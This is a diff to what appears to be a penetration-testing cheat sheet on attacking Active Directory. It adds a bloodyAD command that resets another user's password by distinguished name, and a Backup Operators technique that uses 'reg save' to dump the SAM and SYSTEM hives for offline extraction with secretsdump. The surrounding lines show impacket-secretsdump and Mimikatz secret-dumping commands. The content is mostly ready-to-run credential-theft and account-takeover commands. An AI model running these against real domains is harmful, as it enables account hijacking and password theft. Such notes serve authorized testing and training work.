@@ -206,6 +206,12 @@ Use this for interacting with AD objects from Kali without requiring a full Wind
   bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 set password 'CN=target_user,CN=Users,DC=domain,DC=local' 'NewPassword123!'
   ```
 
+- **Reset User Password (bloodyAD Target CN)**:
+  - *Scenario*: When you have the specific CN of the user (e.g. `CN=DONNA CHAMBERS,CN=USERS,DC=ZEUS,DC=CORP`).
+  ```bash
+  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [DC_IP] set password 'CN=[TARGET_CN]' '[NEW_PASSWORD]'
+  ```
+
 ### Group Policy (GPO) Abuse
 Requires `WriteOwner` or `GenericAll` over a GPO object.
 
@@ -283,6 +289,16 @@ Requires `WriteOwner` or `GenericAll` over a GPO object.
   impacket-secretsdump -sam SAM -system SYSTEM LOCAL
   impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
   ```
+
+- **Backup Operators Access (Bypass ACLs)**:
+  - *Indicator*: `whoami /all` shows `BUILTIN\Backup Operators`.
+  - *Method*: Bypass ACLs to dump the SAM and SYSTEM hives.
+  - *Execution (PowerShell)*:
+    ```powershell
+    reg save hklm\sam sam.save
+    reg save hklm\system system.save
+    ```
+  - *Note*: You can then download these files and Use `secretsdump.py` locally.
 - **Mimikatz Secrets & SAM Dump (Authenticated SYSTEM)**:
   ```powershell
   .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
